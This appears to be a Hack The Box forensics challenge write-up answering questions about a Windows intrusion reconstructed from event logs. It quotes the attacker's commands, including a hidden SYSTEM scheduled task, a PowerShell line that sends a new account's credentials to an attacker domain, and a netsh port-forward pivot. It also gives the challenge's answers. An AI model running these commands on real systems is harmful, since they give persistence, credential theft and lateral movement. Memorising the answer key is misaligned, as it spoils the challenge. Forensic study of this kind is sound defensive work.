# Holmes 2025 3: The Enduring Echo

Hack the Box Room link: [here](https://app.hackthebox.com/sherlocks/Holmes%25202025%25203%253A%2520The%2520Enduring%2520Echo?tab=play_sherlock)

1. What was the first (non cd) command executed by the attacker on the host?
*Answer*: systeminfo
* Looking at the Security event log and focusing on event id 4688 for process creation. Filter the executable info down to focus on CMD and find the activity as ```C:\Windows\System32\cmd.exe cmd.exe /Q /c systeminfo 1&gt; \\127.0.0.1\ADMIN$\__1756075857.955773 2&gt;&amp;1``` at 2025-08-24 22:51:09 with target user HEISEN-9-WS-6\Werni. 
2. Which parent process (full path) spawned the attacker’s commands?
*Answer*: C:\Windows\System32\wbem\WmiPrvSE.exe
* From above. 
3. Which remote-execution tool was most likely used for the attack?
*Answer*: wmiexec.py
* Googled "remote execution tools using wmiprvse.exe and 127.0.0.1\ADMIN$" and it came up as one of the initial tools.  
4. What was the attacker’s IP address?
*Answer*: 10.129.242.110
* Looking within the Security event log and filtering for process execution events with 4688 there was an interesting event which added something to the hosts file as ```C:\Windows\System32\cmd.exe cmd  /C "echo 10.129.242.110 NapoleonsBlackPearl.htb &gt;&gt; C:\Windows\System32\drivers\etc\hosts" ```. The event occurred at 2025-08-24 23:00:15. 
5. The attacker established multiple persistence mechanisms. What is set as the name of the earliest one created?
*Answer*: SysHelper Update
* Filtering for event ID 4688 within the Security event logs as well as the target user of HEISEN-9-WS-6\Werni, you can find ```C:\Windows\System32\cmd.exe cmd.exe /Q /c schtasks /create /tn "SysHelper Update" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1" /sc minute /mo 2 /ru SYSTEM /f 1&gt; \\127.0.0.1\ADMIN$\__1756076432.886685 2&gt;&amp;1```. The activity occurred at 2025-08-24 23:03:50. 
6. Identify the script executed by the persistence mechanism.
*Answer*: C:\Users\Werni\Appdata\Local\JM.ps1
* From answer above. 
7. What local account did the attacker create?
*Answer*: svc_netupd
* Focus on event ID 4720 within the Security Event log to find user account creations. There was an account creation for user svc_netupd at 2025-08-24 23:05:09, which falls in line with timeline. The username is also referenced in the JM.ps1 file for checking for persistence with the user. 
8. What domain name did the attacker use for credential exfiltration?
*Answer*: NapoleonsBlackPearl[.]htb
* Identified within the JM.ps1 file that was found during earlier persistence mechanism detection. The file contained ```Invoke-WebRequest -Uri "http://NapoleonsBlackPearl.htb/Exchange?data=$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$newUser|$password")))" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null``` which points to the use of web requests for exfil. This domain also showed up in the hosts file too with the IP address of the attacker. 
9. What password did the attacker's script generate for the newly created user?
*Answer*: [Never able to determine]
* The commands to execute to find the password within the JM.ps1 file are: ```    
$timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
$password = "Watson_$timestamp"
$securePass = ConvertTo-SecureString $password -AsPlainText -Force
```
10. What was the IP address of the internal system the attacker pivoted to?
*Answer*: 192[.]168[.]1[.]101
* Can be found at the registry location: HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp. But, the actual command line shows up in Security event logs with Event ID 4688 as ```C:\Windows\System32\netsh.exe netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=192.168.1.101 connectport=22```. This action occurred at 2025-08-24 23:10:05
11. Which TCP port on the victim was forwarded to enable the pivot?
*Answer*: 9999
* Can be found at the registry location: HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp. But, the actual command line shows up in Security event logs with Event ID 4688 as ```C:\Windows\System32\netsh.exe netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=192.168.1.101 connectport=22```. This action occurred at 2025-08-24 23:10:05. 
12. What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings?
*Answer*: HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp
* Googled this! 
13. What is the MITRE ATT&CK ID associated with the previous technique used by the attacker to pivot to the internal system?
*Answer*: T1090.001
* Did some googling to figure out that this is SSH tunneling using Internal Proxy. Link here: https://attack.mitre.org/techniques/T1090/001/
14. Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this?
*Answer*: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
* Googled this answer to find what they user would need to do. Found the actual line in the logs located here: ```\C\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline```. 